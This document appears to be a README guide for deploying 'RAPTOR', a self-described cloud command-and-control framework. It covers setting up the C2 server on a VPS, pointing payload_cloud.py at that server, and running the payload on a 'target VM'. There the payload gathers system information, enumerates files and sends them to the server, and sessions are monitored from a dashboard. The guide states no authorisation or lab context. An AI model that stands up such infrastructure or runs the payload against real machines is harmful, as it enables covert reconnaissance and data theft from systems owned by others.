# ☁️ How to Deploy RAPTOR to the Cloud

## 🎯 Goal

You want to:
1. **Deploy the C2 server** to your cloud VPS (always running)
2. **Run the payload** on a separate target VM (sends data to your VPS)

---

## 📦 What You Have

- **VPS**: Your cloud server (Ubuntu, any provider)
- **Target VM**: Where you run the payload (Windows/Linux)

---

## 🚀 Step-by-Step Guide

### Step 1: Deploy C2 to Your VPS

**SSH into your VPS:**
```bash
ssh root@your-vps-ip
```

**Run the automated deployment script:**
```bash
# Download and run
wget https://raw.githubusercontent.com/yourusername/raptor/main/deploy_to_vps.sh
chmod +x deploy_to_vps.sh
sudo ./deploy_to_vps.sh
```

**Follow the prompts:**
- Enter your domain (or VPS IP)
- Enter your GitHub username
- Choose SSL (y/n)
- Create admin password

**Done!** Your C2 is now running at: `http(s)://your-domain.com`

---

### Step 2: Test Your Deployment

**From your local machine:**
```bash
./test_cloud_deployment.sh https://your-domain.com
```

**Or manually test:**
```bash
curl -X POST https://your-domain.com/api/submit_scan/ \
  -H "Content-Type: application/json" \
  -d '{"recon_data":{"hostname":"test"}}'
```

**You should see:** `{"session_id": "...", "status": "recon"}`

---

### Step 3: Configure Payload for Your VPS

**Edit `payload_cloud.py`:**

```python
# Change this line:
C2_SERVER = "http://127.0.0.1:8000"  # ❌ Old (localhost)

# To your VPS:
C2_SERVER = "https://your-domain.com"  # ✅ New (your VPS)
```

---

### Step 4: Run Payload on Target VM

**On your target VM:**

```bash
# Install dependencies
pip3 install psutil requests

# Run payload
python3 payload_cloud.py
```

**The payload will:**
1. Gather system info
2. Enumerate files
3. Send to your VPS C2
4. Wait for AI analysis
5. Show final results

---

## 📊 Monitor Sessions

### Web Dashboard
Visit: `https://your-domain.com/admin/`
- Login with your admin credentials
- View all sessions
- Download reports

### API
```bash
curl https://your-domain.com/api/session/<session-id>/
```

### Server Logs
```bash
# On your VPS
sudo journalctl -u raptor -f
```

---

## 🔧 Common Commands

| Task | Command |
|------|---------|
| **Start C2** | `sudo systemctl start raptor` |
| **Stop C2** | `sudo systemctl stop raptor` |
| **Restart C2** | `sudo systemctl restart raptor` |
| **View Logs** | `sudo journalctl -u raptor -f` |
| **Check Status** | `sudo systemctl status raptor` |

---

## 🐛 Troubleshooting

### Payload can't connect to C2

1. **Check if C2 is running:**
   ```bash
   sudo systemctl status raptor
   ```

2. **Check firewall:**
   ```bash
   sudo ufw status
   # Should show: 80/tcp ALLOW, 443/tcp ALLOW
   ```

3. **Test from target VM:**
   ```bash
   curl -v https://your-domain.com/api/submit_scan/
   ```

### 502 Bad Gateway

```bash
# Restart services
sudo systemctl restart raptor
sudo systemctl restart nginx

# Check logs
sudo journalctl -u raptor -n 50
```

---

## 📚 Full Documentation

- **Quick Start**: [`docs/QUICKSTART_CLOUD.md`](./QUICKSTART_CLOUD.md)
- **Detailed Guide**: [`docs/CLOUD_DEPLOYMENT.md`](./CLOUD_DEPLOYMENT.md)
- **Architecture**: [`docs/ARCHITECTURE.md`](./ARCHITECTURE.md)

---

## 🎯 Architecture Diagram

```
┌────────────────────────────┐
│   Your VPS (Cloud)         │
│   ┌────────────────────┐   │
│   │  RAPTOR C2         │   │
│   │  Django + AI       │   │
│   │  Port: 443 (HTTPS) │   │
│   └────────▲───────────┘   │
│            │                │
│   https://your-domain.com  │
└────────────┼───────────────┘
             │
             │ Internet
             │
┌────────────┼───────────────┐
│   Target VM (Anywhere)     │
│   ┌────────▼───────────┐   │
│   │  payload_cloud.py  │   │
│   │  Sends recon data  │   │
│   └────────────────────┘   │
└────────────────────────────┘
```

---

## ✅ Files You Need

1. **On VPS (server-side):**
   - `deploy_to_vps.sh` - Automated deployment script

2. **On Target VM (client-side):**
   - `payload_cloud.py` - Enhanced payload for cloud C2

3. **Testing:**
   - `test_cloud_deployment.sh` - Verify deployment works

---

## 🎉 Success Checklist

- [ ] VPS has RAPTOR C2 running
- [ ] Can access admin panel
- [ ] Test API returns session_id
- [ ] Payload connects from target VM
- [ ] Reports generate successfully
- [ ] Firewall configured (ports 80, 443)
- [ ] SSL enabled (if using domain)

---

**That's it! You now have a fully operational cloud-based C2 framework! 🚀**

For questions or issues, check the full documentation in `docs/CLOUD_DEPLOYMENT.md`
